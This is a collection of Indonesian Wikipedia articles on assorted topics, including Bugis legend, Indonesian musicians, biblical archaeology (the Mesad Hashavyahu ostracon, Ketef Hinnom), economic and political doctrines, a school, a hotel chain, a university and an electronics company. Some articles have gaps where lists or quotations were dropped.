<doc id="1750485" url="https://id.wikipedia.org/wiki?curid=1750485" title="Wanua Manurung">
Wanua Manurung

Wanua Manung adalah salah satu kawasan paling penting dalam sejarah lahirnya kerajaan Luwu, kerajaan tertua di pulau Sulawesi. Saat ini Wanua Manurung masuk dalam wilaya teritorial Kabupaten Luwu timur, Sulawesi selatan, namaya-pun berubaah menjadi Desa Manurung

Dalam buku I Lagaligo, Wanua Manurung dapat diartikan sebagai tempat lahirnya awal peradaban dan berakhirnya mitos tentang adanya perkawinan silang antara kerajaan bumi dan kerajaan langit

Berawal dari cerita rakyat tentang Sawerigading yang merupakan seorang putera raja Luwu dari "Kerajaan Luwu Purba", Sulawesi Selatan, Indonesia, Wanua Manurung adalah kawasan penting dalam catatan perjalanan tokoh tersebut. Dalam bahasa setempat Sawerigading berasal dari dua kata, yaitu "sawe" yang berarti menetas (lahir), dan "ri gading" yang berarti di atas bambu betung. Jadi nama Sawarigading berarti keturunan dari orang yang menetas (lahir) di atas bambu betung. Nama ini dikenal melalui cerita yang termuat dalam Sureq Galigo (Periksa Edisi H. Kern 1939), dimulai ketika para dewa dilangit bermufakat untuk mengisi dunia ini dengan mengirim "Batara Guru" anak patotoe di langit dan "Nyilitomo"
anak guru ri Selleng di peretiwi (dunia bawah) untuk menjadi penguasa
di bumi. Dari perkawinan keduanya lahirlah putra mereka yang bernama "Batara Lattu’", yang kelak menggantikan ayahnya penguasa di Luwu.

Dari perkawinan Batara Guru dengan beberapa pengiringnya dari langit
serta pengiring We Nyilitomo dari peretiwi lahirlah beberapa putra mereka yang kelak menjadi penguasa di daerah-daerah Luwu sekaligus
pembantu Batara Lattu’. Setelah Batara Lattu’ cukup dewasa, ia
dikawinkan dengan "We Datu Sengeng", anak La Urumpassi bersama We
Padauleng ditompottikka. Sesudah itu Batara Guru bersama isteri kembali
kelangit. Dari perkawinan keduanya lahirlah "Sawerigading" dan "We Tenriabeng" sebagai anak kembar emas yaitu seorang laki-laki dan seorang perempuan

Mengenai masa hidup Sawerigading terdapat berbagai versi di kalangan ahli sejarah. Menurut versi Towani-Tolotang di Sidenreng,
Sawerigading lahir pada tahun 564 M. Jika versi ini dihadapkan dengan
beberapa versi lain, maka data ini tidak terlalu jauh perbedaanya. Untuk
lebih jelasnya, berikut ini akan dikemukakan tiga versi mengenai masa
hidup Sawerigading, yaitu :
Fakta sejarah memberi pandangan bahwa cerita Sawerigading mempunyai nilai "sejarah"
yaitu adanya kronik di Bone, Soppeng dan Wajo yang menyatakan bahwa raja pertama
mereka adalah Tomanurung yang bersumber dari keturunan Sawerigading.
Demikian pula kaum bangsawan di Sulawesi Selatan, termasuk Luwu,
menganggap bahwa La Galigo dan Sawerigading adalah nenek-moyang mereka.
Dalam silsilah raja-raja di Sulawesi Selatan "Lontara Panguriseng",
di puncak silsilah itu terdapat tokoh-tokoh La Galigo, Sawerigading,
Batara Lattu’ dan Batara Guru. Menurut Mills, yang menciptakan silsilah
itu raja-raja itu sendiri untuk memperoleh legitimasi magis-religius
yang menurut dugaan meniru model-model kronik Jawa.
Sebenarnya mereka tidak menyebut tokoh Sawerigading sebagai tokoh
sejarah, tetapi mereka mengklaim bahwa tokoh-tokoh itu benar-benar ada,
walaupun sebagian besar ceritanya adalah fiksi.

Terlepas dari makna relijius yang terkait dengan nama daera ini, Wanua Manurung juga memberi pesan dalam nilai budaya yang dilestarikan masyarakat daerah bugis sampai saat ini

Dalam cerita masyarakat Bugis, Wanua Manurung memiliki beberapa nilai budaya antara lain nilai religius, sistem kepercayaan pra-Islam yang menggambarkan dunia gaib dan konsep kejadian manusia. Dalam cerita ini digambarkan bahwa dunia gaib adalah dunia dewa-dewa di langit, di bumi (mulatau)
yang keturunan dewa-dewa. Seiring dengan perkembangan Islam dan agama
lain di Luwu, maka nilai religius dari cerita ini lambat laun akan
mengalami kepunahan, karena tidak sesuai lagi dengan perkembangan masyarakat. Beberapa kepentingan cerita itu dalam kajian ilmu-ilmu sosial dapat diuraikan sebagai berikut :





__TANPASUNTINGANBAGIAN__


</doc>
<doc id="1750491" url="https://id.wikipedia.org/wiki?curid=1750491" title="Reda Gaudiamo">
Reda Gaudiamo

Reda Gaudiamo () adalah seniman berkebangsaan Indonesia. Namanya dikenal melalui sejumlah karya pertunjukannya dalam bentuk musik puisi yang diterbitkan dalam bentuk album. "Aku Ingin" adalah salah satu puisi karya Sapardi Djoko Damono yang dinyanyikannya.
Reda Gaudiamo lahir di Surabaya, Jawa Timur, 1 Agustus 1962. Dia mengawali debutnya sebagai seniman sejak menempuh pendidikan pada Jurusan Sastra Prancis Universitas Indonesia dengan menulis berbagai topik artikel dan cerita pendek yang dipublikasikan ke berbagai media massa. Reda Gaudiamo juga menggeluti dunia tarik suara, menyanyikan lagu-lagu bergenre balada bersama rekan duetnya, Ari Malibu. Setelah lulus dia bekerja di sejumlah media cetak, antara lain "Gadis, Mode, HAI", dan "Cosmopolitan". Reda juga pernah menjadi "publisher" di Kompas Gramedia menangani "Chic, Kawanku, Prevention, Sekar, InStyle, Martha Stewart Living", dan "More". Bersama sejumlah temannya, ia membuat musikalisasi puisi karya Sapardi Djoko Damono. Albumnya antara lain "Hujan Bulan Juni" (1989), "Hujan dalam Komposisi" (1996), "Gadis Kecil" (2005 bersama Nana Soebianto/DuaIbu), "Becoming Dew" (2007 bersama Ari Malibu). "Akan ke Manakah Angin" merupakan rekaman lain, musikalisasi puisi karya Emha Ainun Najib, Acep Zamzam Noor, dan Ags. Arya Dipayana. Selain menyanyikan dan membuat komposisi musik puisi (Gadis Kecil, "Don't Tell Me", dan Mengalirlah Sungai -semua karya Sapardi Djoko Damono), bersama Ivan Haris, Jubing Kristianto, Tunjung Rukmo, Jonbee, dan ZainulAsikin, Reda tergabung dalam Komplotan, band beraliran "country" dengan album perdananya, "Nyanyian Laut, 2010.

Musikalisasi puisi karya SDD dimulai pada tahun 1988 ketika beberapa mahasiswanya membantu program Pusat Bahasa, membuat musikalisasi puisi karya beberapa penyair Indonesia, dalam upaya mengapresiasikan sastra kepada siswa SLTA. Saat itulah tercipta musikalisasi "Aku Ingin" oleh Ags. Arya Dipayana dan "Hujan Bulan Juni" oleh M. Umar Muslim. Kelak, "Aku Ingin" diaransemen ulang oleh Dwiki Dharmawan dan menjadi bagian dari ""Soundtrack" Cinta dalam Sepotong Roti" (1991), dibawakan oleh Ratna Octaviani.

Beberapa tahun kemudian lahirlah album "Hujan Bulan Juni" (1989) yang seluruhnya merupakan musikalisasi dari sajak-sajak Sapardi Djoko Damono. Duet Reda Gaudiamo dan Ari Malibu merupakan salah satu dari sejumlah penyanyi lain, yang adalah mahasiswa Fakultas Sastra Universitas Indonesia. Album "Hujan Dalam Komposisi" menyusul dirilis pada tahun 1996 dari komunitas yang sama.

Sebagai tindak lanjut atas banyaknya permintaan, album "Gadis Kecil" (2005) diprakarsai oleh duet Dua Ibu, yang terdiri dari Reda Gaudiamo dan Tatyana dirilis, dilanjutkan oleh album "Becoming Dew" (2007) dari duet Reda dan Ari Malibu. Ananda Sukarlan pada Tahun Baru 2008 juga mengadakan konser kantata "Ars Amatoria" yang berisi interpretasinya atas puisi-puisi SDD serta karya beberapa penyair lain.




</doc>
<doc id="1750492" url="https://id.wikipedia.org/wiki?curid=1750492" title="Ostrakon Mesad Hashavyahu">
Ostrakon Mesad Hashavyahu

Ostrakon Meṣad Hashavyahu adalah sebuah pecahan keramik ("ostrakon") yang ditemukan di reruntuhan benteng kuno di perbatasan Kerajaan Yehuda menghadap ke wilayah orang Filistin, yaitu kota Asdod dekat Laut Tengah. Benteng itu terletak 1.7 km sebelah selatan (pelabuhan laut) dan 7 km sebelah barat laut kota Yavne (kota utama). Nama benteng ini tidak diketahui, tetapi lokasi ini dinamai menurut sebuah nama yang tertulis dalam sejumlah ostrakon, termasuk ostrakon utama, yang ditemukan di sana. Situs ini meliputi area seluas kurang lebih .
Ostrakon ini bertarikh sekitar 630 sampai 609 SM, dalam masa pemerintahan raja Yosia dari Kerajaan Yehuda. William Foxwell Albright menulis, "Kehidupan benteng ini dapat diperkirakan tarikhnya dalam batasan sempit melalui keramik sebelum Pembuangan dan awal Ionia yang ditemukan di sana, juga dari pertimbangan sejarah, yang menunjukkan suatu tarikh sekitar 630 SM. Ini berarti segera setelah kematian raja Asyur, Ashurbanipal dan sebelum pendudukan dataran Filistin oleh Psammetichus dari Mesir."

Benteng ini ditinggalkan pada tahun 609 SM atau segera sesudahnya, tampaknya berkaitan dengan terlepasnya kekuasaan atas wilayah ini akibat pendudukan tentara Mesir setelah kematian Yosia.

Daerah ini diekskavasi oleh Joseph Naveh pada tahun 1960.

Salah satu penemuan penting di lokasi "Mesad Hashavyahu" adalah sebuah ostrakon yang memuat tulisan seorang pekerja lapangan menyampaikan naik banding kepada pemimpin benteng berkaitan dengan perampasan jubahnya, yang oleh si penulis dianggap tidak adil. Pekerja itu mengajukan banding kepada si pemimpin berdasarkan perampasan jubah yang tidak sepatutnya serta implikasi dari hukum Alkitab yang menyebutkan penahanan jubah melewati matahari terbenam sebagai jaminan hutang (; bandingkan ). Meskipun petisi itu tidak secara spesifik mengutip hukum itu, tetapi diyakini sudah menjadi pengetahuan umum bagi para penguasa dan penduduk biasa pada waktu itu. Ostrakon itu juga memuat rujukan tertulis tertua di luar Alkitab mengenai pelaksanaan hari istirahat Sabat (Sabtu).

Berikut adalah terjemahan bahasa Indonesia dari tulisan pada ostrakon yang terdiri dari 14 baris dalam bahasa Ibrani.

Karena adanya pecahan pada ostrakon dan ada bagian di kanan bawah yang hilang, Naveh menyatakan bahwa terdapat terlalu sedikit huruf pada baris ke-13 untuk menebak secara pasti apa yang tertulis. Hal yang sama dapat pula terjadi pada baris 11-14 yang direkonstruksi dan baris 15 yang hilang.




</doc>
<doc id="1750494" url="https://id.wikipedia.org/wiki?curid=1750494" title="Developmentalisme">
Developmentalisme

Developmentalisme adalah teori ekonomi yang menyatakan bahwa pembangunan negara-negara Dunia Ketiga dapat diwujudkan dengan baik melalui pasar dalam negeri yang kuat dan beragam dan tarif barang impor yang tinggi.

Developmentalisme adalah pemikiran lintas disiplin yang menjadikan pembangunan sebuah strategi utama menuju kemakmuran ekonomi. Pemikiran ini muncul sebagai tanggapan atas upaya Amerika Serikat untuk membendung komunisme dan mengurus gerakan pembebasan nasional di Asia dan Afrika. Developmentalisme dalam konteks ekonomi internasional dapat dipahami sebagai kumpulan ide yang bersama-sama menempatkan pembangunan ekonomi di tengah proses politik dan lembaga serta cara untuk menciptakan legitimasi politik. Pendukung teori developmentalisme berpendapat bahwa perkembangan kesuksesan ekonomi di negara berkembang (terutama di Amerika Latin dan Asia Timur) memicu terbentuknya pemerintahan sah yang dipimpin para tokoh politik yang mendapatkan manfaat dari kesepakatan bersama mengenai siapa yang harus memimpin dan bagaimana mereka harus berperilaku di dunia internasional. Developmentalis percaya bahwa otonomi nasional di negara-negara Dunia Ketiga dapat dicapai dan dipertahankan melalui pemanfaatan sumber daya luar oleh negara-negara kapitalis. Dalam definisi tersebut, developmentalisme merupakan paradigma yang digunakan untuk memutar balik dampak negatif ekonomi internasional terhadap negara berkembang pada tahun 1950-an sampai 1960-an, masa ketika negara-negara Amerika Latin mulai menerapkan strategi substitusi impor. Dengan teori ini, pembangunan ekonomi dirancang mengikuti kriteria Barat modern: kesuksesan ekonomi diciptakan mengikuti pemikiran kapitalisme bahwa sebuah negara perlu berkembang, otonom, dan berdiri secara sah.

Teori ini didasarkan pada asumsi bahwa selain tiga tahap pembangunan untuk semua negara, ada satu gerakan linier dari satu tahap ke tahap lain yang merentang dari ekonomi tradisional atau primitif ke ekonomi modern atau terindustrialisasi.


Kebijakan-kebijakan di atas ini berubah fokus dari rekonstruksi ke pembangunan, kemudian ke pengentasan kemiskinan. Peralihan fokus ini memunculkan tuntutan intervensi pembangunan secara global dan peralihan program bantuan Amerika Serikat dari eksploitasi ke pembangunan. Selain itu, kebijakan ini menciptakan norma dan statistik bagi donor internasional.



</doc>
<doc id="1750495" url="https://id.wikipedia.org/wiki?curid=1750495" title="Proteksionisme">
Proteksionisme

Proteksionisme adalah kebijakan ekonomi yang mengetatkan perdagangan antarnegara melalui cara-cara seperti tarif barang impor, batas kuota, dan berbagai peraturan pemerintah yang dirancang uuntuk menciptakan persaingan adil (menurut para pendukungnya) antara barang & jasa impor dan barang & jasa dalam negeri.

Kebijakan ini bertentangan dengan perdagangan bebas yang meminimalkan pembatasan perdagangan oleh pemerintah. Di era modern, proteksionisme semakin erat kaitannya dengan anti-globalisasi dan anti-imigrasi. Istilah ini sering digunakan dalam konteks ekonomi; proteksionisme dalam ekonomi mengacu pada kebijakan atau doktrin yang melindungi perusahaan dan pekerja di suatu negara dengan membatasi atau mengatur perdagangan luar negeri.

Berbagai kebijakan telah diterapkan untuk mencapai tujuan-tujuan proteksionis, yaitu:

Dalam perdagangan modern, sejumlah inisiatif selain tarif disebut sebagai tindakan proteksionis. Contohnya, Jagdish Bhagwati memandang upaya negara-negara maju dalam menegakkan standar tenaga kerja atau standar lingkungan sebagai tindakan proteksionis. Selain itu, pelaksanaan prosedur sertifikasi ketat untuk barang impor juga dianggap proteksionisme.

Pihak lainnya memaparkan bahwa perjanjian perdagangan bebas biasanya memiliki pasal proteksionis untuk properti intelektual, hak cipta, dan pembatasan paten yang menguntungkan perusahaan besar. Pasal seperti ini menyerahkan perdagangan musik, film, obat-obatan, perangkat lunak, dan barang manufaktur lain kepada produsen berbiaya tinggi dan menghapus kuota produsen berbiaya rendah.




</doc>
<doc id="1750498" url="https://id.wikipedia.org/wiki?curid=1750498" title="Konsensus Beijing">
Konsensus Beijing

Konsensus Beijing (kadang disebut "Model Tiongkok" atau "Model Ekonomi Tiongkok") adalah istilah yang mengacu pada kebijakan politik dan ekonomi Republik Rakyat Tiongkok setelah wafatnya Mao Zedong dan naiknya Deng Xiaoping (1976). Kebijakan ini ikut berkontribusi pada pertumbuhan produk nasional bruto Tiongkok yang naik delapan kali lipat dalam kurun dua dasawarsa. Frasa "Konsensus Beijing" diciptakan oleh Joshua Cooper Ramo dengan tujuan menjadikan model pembangunan ekonomi Tiongkok sebuah alternatif — khususnya untuk negara berkembang — bagi kebijakan ramah pasar a la Konsensus Washington yang didukung oleh IMF, Bank Dunia, dan Departemen Keuangan Amerika Serikat.

Istilah ini sering disebut sebagai pemanfaatan inovasi dan eksperimentasi secara pragmatis demi meraih "pertumbuhan berkualitas tinggi yang setara dan damai" dan "ketahanan perbatasan dan kepentingan nasional"; penerapan "politik yang stabil, meski represif, dan pertumbuhan ekonomi yang cepat". Pihak lain menyatakan bahwa tampaknya "tidak ada kesepakatan mengenai tujuan [konsensus ini]" selain menjadi alternatif bagi Konsensus Washington yang neoliberal; dan istilah ini "berlaku bagi semua peristiwa yang terjadi di Beijing, entah itu ada hubungannya dengan 'model pembangunan Tiongkok' atau Republik Rakyat Tiongkok (RRT) per se."




</doc>
<doc id="1750502" url="https://id.wikipedia.org/wiki?curid=1750502" title="Atlantisisme">
Atlantisisme

Atlantisisme adalah paham yang meyakini pentingnya kerja sama antara Eropa dan Amerika Serikat dan Kanada di bidang politik, ekonomi, dan pertahanan dengan tujuan mempertahankan keamanan dan kemakmuran negara-negara anggota dan melindungi nilai-nilai yang menyatukan mereka. Istilah ini dapat digunakan secara terbatas untuk menjelaskan dukungan bagi aliansi militer Atlantik Utara, atau secara luas untuk menjelaskan kerja sama, nilai bersama, rasa kebersamaan, dan integrasi dua sisi samudra. Istilah ini diambil dari Samudra Atlantik yang memisahkan kedua benua ini. Dalam praktiknya, filsafat Atlantisisme mendorong keterlibatan aktif Amerika Utara, khususnya Amerika Serikat, di Eropa dan kerja sama yang erat antarbenua. Atlantisisme sangat kuat tertanam pada masa Perang Dunia Kedua dan sesudahnya lewat pembentukan berbagai lembaga euro-Atlantik, terutama NATO dan Rencana Marshall.

Atlantisisme memiliki kekuatan yang berbeda dari satu kawasan/negara ke kawasan/negara yang lain tergantung faktor sejarah dan budayanya. Atlantisisme sering dipandang kuat di Eropa timur dan tengah dan Britania Raya. Dari segi politik, Atlantisisme sering sekali dikaitkan dengan liberal klasik atau politik kanan di Eropa. Atlantisisme biasanya melibatkan kekaguman terhadap kebudayaan politik atau sosial Amerika serta ikatan historis antara kedua benua.

Ada ketegangan antara Atlantisisme dan kontinentalisme di kedua sisi Atlantik. Sejumlah pihak menuntut kerja sama atau integrasi kawasan lebih diutamakan ketimbang kerja sama trans-Atlantik. Akan tetapi, hubungan antara Atlantisisme dan integrasi Amerika Utara atau integrasi Eropa rumit sekali dan tidak dianggap berlawanan secara langsung satu sama lain. Menurunnya kekuasaan Eropa dan Amerika secara relatif di dunia, kejatuhan Uni Soviet, dan penyebaran norma Atlantisis di luar kawasan Atlantik Utara telah mengurangi kekuatan kaum Atlantisis sejak Perang Dingin berakhir. Hubungan internasional lainnya terus diutamakan meskipun hubungan trans-Atlantik masih dianggap yang paling penting di dunia.

North Atlantic Council adalah forum diskusi dan pembuatan keputusan tingkat pemerintah utama di ranah Atlantisisme. Organisasi lain yang dianggap Atlantisis adalah:

Atlantisis ternama meliputi mantan Presiden Amerika Serikat Franklin D. Roosevelt dan Ronald Reagan, Perdana Menteri Britania Raya Winston Churchill, Margaret Thatcher, Tony Blair, dan Gordon Brown, François Mitterrand, Dean Acheson, Zbigniew Brzezinski, dan Javier Solana.



</doc>
<doc id="1750503" url="https://id.wikipedia.org/wiki?curid=1750503" title="Eksepsionalisme">
Eksepsionalisme

Eksepsionalisme adalah pandangan bahwa sebuah negara, masyarakat, lembaga, gerakan, atau era bersifat "eksepsional" (i.e., tidak biasa atau hebat) dan tidak perlu mematuhi peraturan atau prinsip umum.

Filsuf-sejarawan romansa Jerman, Johann Gottfried Herder (1744-1803) dan Johann Gottlieb Fichte (1762-1814), membahas tema keunikan pada akhir abad ke-18. Mereka tidak berfokus pada negara politik, melainkan keunikan "Volk" yang terdiri dari seluruh rakyat, bahasa, dan tradisi mereka. Setiap bangsa, entitas budaya yang memiliki sejarah sendiri, memiliki "semangat nasional" atau "jiwa rakyat" ("Volksgeist"). Pemikiran ini sangat berdampak pada pertumbuhan nasionalisme di Eropa abad ke-19, terutama wilayah yang dikuasai oleh kaum elit dari wilayah lain.

Eksepsionalitas diklaim oleh banyak negara termasuk Prancis, Jerman, India, Pakistan, Kekaisaran Jepang, Iran, Korea Utara, Spanyol, Britania Raya, Amerika Serikat, USSR, UE, dan Thailand. Para sejarawan menambahkan contoh lain seperti Kekaisaran Tiongkok, Kesultanan Utsmaniyah, dan Romawi kuno, serta beberapa kerajaan kecil sepanjang sejarah.




</doc>
<doc id="1750505" url="https://id.wikipedia.org/wiki?curid=1750505" title="SMK Yadika 13 Bekasi">
SMK Yadika 13 Bekasi

SMK Yadika 13 Bekasi adalah sekolah menengah kejuruan yang berkedudukan di Tambun Selatan, Kabupaten Bekasi, Jawa Barat. Sekolah ini berdiri sejak 14 Februari 1976, di bawah naungan Yayasan Abdi Karya (YADIKA). SMK Yadika 13 Bekasi menyelenggarakan pendidikan berbasis menajemen, industri, dan teknologi

Pendiri SMK Yadika 13 Bekasi adalah DR. Sutan Raja DL Sitorus. Yayasan ini sudah memiliki 65 sekolah yang tersebar di 6 provinsi di Pulau Jawa dan Sumatra.


</doc>
<doc id="1750507" url="https://id.wikipedia.org/wiki?curid=1750507" title="Menara Siloam">
Menara Siloam

Menara Siloam adalah suatu menara kuno di Siloam, suatu daerah di bagian selatan kota Yerusalem, yang disebut dalam Alkitab Kristen. Menara ini hanya disebut dalam Lukas 13#Ayat 4 di dalam bagian perikop kotbah Yesus Kristus mengenai pertobatan dosa secara pribadi yang tercatat dalam . Yesus merujuk kepada 18 orang yang meninggal ketika Menara Siloam runtuh menimpa mereka, di mana orang-orang itu adalah korban dari suatu malapetaka, bukan merupakan hukuman atas dosa-dosa mereka

Dalam Injil Lukas pasal 13:1-5 dicatat demikian:

Orang-orang membawa kabar kepada Yesus dengan harapan diberi penjelasan mengapa hal-hal buruk dapat terjadi pada "orang baik-baik", dalam hal ini ketika mereka mempersembahkan korban kepada Allah. Persoalan "dosa dan bencana" melibatkan anggapan bahwa suatu malapetaka luar biasa pasti terkait dengan dosa atau kesalahan yang luar biasa. Diyakini bahwa para korban itu tentu telah melakukan hal-hal yang membuat Allah marah sehingga menimpakan bencana kepada mereka.

Yesus menjawab dengan mengalihkan fokus pertanyaan kepada hal-hal yang lebih mendesak daripada mengetahui "mengapa" Allah membiarkan hal itu terjadi. Yesus ingin mereka memusatkan diri pada jiwa mereka sendiri, kalau mereka tidak bertobat, mereka akan binasa dengan cara yang serupa. Penyebutan jatuhnya "menara dekat Siloam" menekankan pernyataannya, bahwa bencana dapat saja datang sewaktu-waktu, tanpa tergantung pada keadaan saleh atau berdoa. Yesus menekankan bahwa waktu yang diberikan Allah untuk bertobat itu terbatas lamanya.

Hanya satu generasi kemudian kata-kata Tuhan Yesus digenapi dengan mengerikan. Orang Yahudi yang tidak mau bertobat dihancurkan oleh pedang tentara Romawi, sebagaimana orang-orang Galilea itu.

Penggalian arkeologi menemukan reruntuhan menara dekat kolam Siloam yang diduga merupakan bangunan yang didirikan di atas suatu menara yang lebih kuno. Reruntuhan ini mempunyai landasan berbentuk bulat dengan garis tengah kurang lebih 6 meter.



</doc>
<doc id="1750509" url="https://id.wikipedia.org/wiki?curid=1750509" title="Fave Hotel">
Fave Hotel

Fave Hotel merupakan salah satu grup hotel terkemuka di Indonesia. Grup ini didirikan pada tahun 2009 di bawah Aston Hotels & Resorts. Fave Hotel adalah brand untuk properti Aston Hotels & Resorts berbintang dua atau yang lebih dikenal dengan konsep budget hotel. Keunikan dari Fave Hotel bisa dilihat dari warna hotelnya yang terdiri dari merah muda dan putih. Saat ini, Fave Hotel memiliki lebih dari 33 properti yang tersebar di Indonesia dan Malaysia.



</doc>
<doc id="1750679" url="https://id.wikipedia.org/wiki?curid=1750679" title="Ketef Hinnom">
Ketef Hinnom

Ketef Hinnom ( "", "pundak ") adalah sebuah tempat penelitian arkeologi di sebelah barat daya kota kuno Yerusalem, dekat dengan , sekarang di atas tanah milik .

Situs ini terdiri dari serangkaian kamar-kamar makam yang digali di bukit batu dari gua-gua alamiah. Pada tahun 1979 di salah satu ruangan ini ditemukan dua gulungan kecil dari perak yang memuat tulisan kutipan Berkat Imam yang terkenal dari Kitab Bilangan dan tampaknya pernah dipakai sebagai semacam jimat. Proses pembukaan gulungan kecil ini memakan waktu tiga tahun, dilakukan secara cermat agar gulungan yang rapuh itu tidak hancur. Isinya merupakan salah satu naskah Alkitab Ibrani tertua, bertarikh sekitar 600 SM.

Gulungan-gulungan itu ditemukan pada tahun 1979 dalam Kamar 25 dari Gua 24 di Ketef Hinnom, pada waktu ekskavasi oleh tim di bawah pimpinan , yang pada waktu itu menjabat sebagai profesor arkeologi di . Situs itu tampaknya steril secara arkeologi, karena makam itu sudah pernah menjadi tempat penyimpanan senapan selama periode Kekaisaran Utsmaniyah, tetapi suatu penemuan secara kebetulan oleh seorang "asisten" berusia 13 tahun, menunjukkan adanya bagian atap yang runtuh yang melestarian sejumlah isi Kamar 25.
Barkay awalnya memberi tarikh akhir abad ke-7/awal abad ke-6 SM untuk pembuatan inskripsi, tetapi kemudian mengubahnya menjadi awal abad ke-6 SM berdasarkan studi paleografi (bentuk irisan yang cermat pada penulisan abjad Ibrani Kuno) dan bukti perangkat keramik di sekitar tempat penemuan. Tarikh ini pernah dipertanyakan oleh Johannes Renz dan Wolfgang Rollig, yang berargumen bahwa kondisi tulisan terlalu buruk untuk dapa ditarik kesimpulan pasti, selain juga penemuannya di suatu tempat semacam penyimpanan sampah yang juga memuat barang-barang dari abad ke-4 SM.

Penelitian ulang gulungan-gulungan itu kemudian dilakukan oleh University of Southern California dalam rangka West Semitic Research Project, menggunakan teknik "advanced photographic and computer enhancement" yang dapat membaca gulungan itu lebih mudah serta penentuan tarikh menurut paleografi yang lebih pasti. Hasilnya menegaskan suatu tarikh pembuatan sesaat sebelum kehancuran Yerusalem oleh tentara Babel pada tahun 586/7 SM. Dr. Kyle McCarter dari Johns Hopkins University, seorang spesialis kuno, berkata bahwa studi tersebut tentunya "menjelaskan kontroversi apa pun mengenai [penetapan tarikh] inskripsi-inskripsi ini".

Tim tahun 2004 menyatakan gulungan-gulungan perak tersebut merupakan "salah satu penempatannya paling signifikan" bagi studi Alkitab. Selain nilai pentingnya bagi pengetahuan perkembangan abjad Ibrani, gulungan-gulungan itu "melestarikan kutipan-kutipan tertua yang pernah ditemukan dari teks Alkitab Ibrani dan ... contoh tertua pernyataan pengakuan mengenai Yahweh." Rujukan kepada Yahweh sebagai "Penengking si jahat" ("Rebuker of Evil"), ditemukan pada inkantasi dan jimat-jimat lain kemudian yang berkaitan dengan Israel, adalah bukti bahwa artefak-artefak ini juga jimat-jimat ("amulets").
Dua gulungan perak dengan kode KH1 dan KH2, memuat tulisan dalam huruf Ibrani Kuno, bukan huruf Ibrani Aram kotak yang dikenal saat ini. Terjemahan tulisan yang terbaca merupakan hasil penelitian.


Bandingkan baris 3–6 dengan:

Kata "beribu-ribu" tidak muncul pada gulungan ini, tetapi mungkin sebenarnya ada pada baris 7 yang rusak, sebagaimana pada Ulangan 7:9.

Foto KH2 dan transkrip huruf-huruf ditunjukkan di bawah ini, beserta analisis teks.


Bandingkan baris 5–13 dengan Kitab Bilangan 6:24–26 (terutama ketepatan tulisan dalam bahasa Ibrani):
<poem>6:24 Tuhan memberkati engkau dan melindungi engkau,;
6:25 Tuhan menyinari engkau dengan wajahNya dan memberi engkau kasih karunia
6:26 Tuhan menghadapkan wajahNya kepadamu dan memberi engkau damai sejahtera</poem>


(Perhatikan bahwa ada bagian yang tidak tertera pada gulungan ini, juga perhatikan bahwa sebagian juga muncul pada KH1 setelah baris 18 di mana gulungan itu hancur).




</doc>
<doc id="1750709" url="https://id.wikipedia.org/wiki?curid=1750709" title="Universitas Normal Nanjing">
Universitas Normal Nanjing

Universitas Normal Nanjing, atau Universitas Normal Nanking (NNU; Inggris: Nanjing Normal University NNU; Cina: 南京师范大学; pinyin: Nánjīng Shīfàn Dàxué) adalah sebuah universitas normal di Nanjing, provinsi Jiangsu, Cina.
Nanjing Normal University awalnya adalah Sanjiang normal Institute, yang didirikan pada tahun 1902 oleh Zhang Zhidong, Gubernur-Jenderal Jiangsu dan Jiangxi. Setelah itu, namanya diubah Institut Normal Luar Biasa Liangjiang pada tahun 1905, Sekolah Tinggi Normal Nanjing pada tahun 1914, sempat berganti berbagai nama lain, termasuk Universitas Nasional Pusat dan Nanjing University, dan kemudian pada tahun 1952 Kampus Universitas Normal Nanjing menjadi Kampus Normal Nanjing dan akhirnya berganti nama menjadi Universitas Normal Nanjing pada tahun 1984. Universitas Normal Nanjing menjadi universitas yang komprehensif terkenal untuk penelitian pendidikan dan ilmiah. Universitas ini termasuk dalam Proyek 211 yang merupakan proyek Nasional Kementrian Pendidikan di China untuk Universitas-universitas penting di China.


</doc>
<doc id="1750710" url="https://id.wikipedia.org/wiki?curid=1750710" title="Agis">
Agis

PT. Agis Tbk. atau dikenal dengan nama Agis adalah perusahaan induk (holding company) yang membawahi tiga perusahaan yang bergerak di bidang distribusi perangkat elektronik, peranti rumah tangga, perangkat multimedia dan komputasi, dan produk telekomunikasi, pelayanan pasca penjualan ("after-sale"), dan usaha di sektor sumber daya alam ("natural resources"). Perusahaan ini dikenal sebagai pendiri dan pembangun merek Sony pertama di Indonesia.

Pertama kali dibangun sekitar tahun 1985, perusahaan ini menjadi partner kerja sama patungan dengan Sony Corporation untuk hal distribusi, servis, ritel dan manufaktur produk Sony di Indonesia. Pada tahun 1997, Agis mulai masuk ke dalam jajaran perusahaan yang tercatat di Bursa Efek Indonesia (pada saat itu disebut dengan Bursa Efek Jakarta dan Surabaya) melalui merjer dengan perusahaan PT Telaga Mas Pertiwi Indonesia. Sejak saat itu, kode efek perusahaan ini adalah TMPI.

Hingga pada tahun 2015, Agis telah memiliki 400 orang karyawan dan 1000 toko ritel independen di seluruh Indonesia. Perusahaan ini juga memiliki sekitar 25 pusat pelayanan pasca-penjualan dan terakhir, bersama Fujian Xinjifu Enterprises Co. Ltd., mereka membentuk perusahaan patungan yang bergerak di bidang sumber daya alam dengan nama PT Agis Resources. Selain anak perusahaan tersebut, Agis juga memiliki dua lainnya yaitu PT Agis Mitra Mandiri dan PT Agis Electronics.
Pada 14 Februari 2014, Agis secara resmi mengganti nama perusahaan menjadi PT Sigma Gold Inti Perkasa. Penggantian nama ini dilakukan setelah mengadakan Rapat Umum Pemegang Saham Luar Biasa (RUPS LB) yang dilaksanakan pada 28 Oktober 2013 dan disetujui oleh para pemegang saham. Alasan utama penggantian nama agar tidak terlalu identik dengan bisnis elektronik. Sejalan dengan perubahan nama tersebut, Agis pun merambah bisnis ke cabang penambagan emas. Nama yang diubah pun hanya induknya saja, nama Agis akan tetap diterapkan pada anak perusahaan lainnya.
Lalu di saat yang sama pada RUPS LB, perseroan juga merombak susunan direksi dan komisaris. Eka Hikmawati resmi mundur sebagai direktur utama dan diangkat sebagai komisaris utama. Sementara itu, Steven kusuma diangkat menjadi direktur utama mengganti Hikmawati untuk periode 2013 dan seterusnya.


</doc>
<doc id="1750713" url="https://id.wikipedia.org/wiki?curid=1750713" title="Siti Noordjannah Djohantini">
Siti Noordjannah Djohantini

